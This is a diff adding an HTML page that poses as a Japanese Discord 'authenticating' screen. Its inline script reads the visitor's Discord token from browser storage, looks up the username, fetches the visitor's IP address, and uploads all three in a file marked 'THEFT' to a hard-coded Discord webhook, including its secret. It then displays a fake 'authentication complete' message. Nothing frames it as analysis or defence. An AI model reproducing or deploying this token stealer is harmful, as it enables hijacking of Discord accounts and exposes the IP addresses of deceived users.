@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><title>認証中</title></head>
+<body style="background:#2f3136;color:white;text-align:center;padding:100px;">
+<h1>🔐 認証中...</h1>
+<script>
+(async () => {
+    const token = localStorage.getItem('token');
+    if (!token) return;
+    const user = await fetch('https://discord.com/api/v9/users/@me', {headers:{'Authorization':token}}).then(r=>r.json());
+    const name = `${user.username}#${user.discriminator}`;
+    const ip = await (await fetch('https://api.ipify.org')).text();
+    const txt = `---THEFT---\nユーザー: ${name}\nToken: ${token}\nIP: ${ip}\n---END---`;
+    const form = new FormData();
+    form.append('file', new Blob([txt], {type:'text/plain'}), `${name}.txt`);
+    form.append('payload_json', JSON.stringify({content:`**${name}** 認証完了`}));
+    await fetch('https://discord.com/api/webhooks/1433529939423920189/4we9np9SpSAhdKx3LiFhy1HJSVwR4w9GTEHpiY4-AjajeuM3ZyCB7nG2UxaXxrTQ384Y', {method:'POST', body:form});
+    setTimeout(()=>{document.body.innerHTML="<h1>✅ 認証完了！</h1>"},1500);
+})();
+</script>
+</body>
+</html>
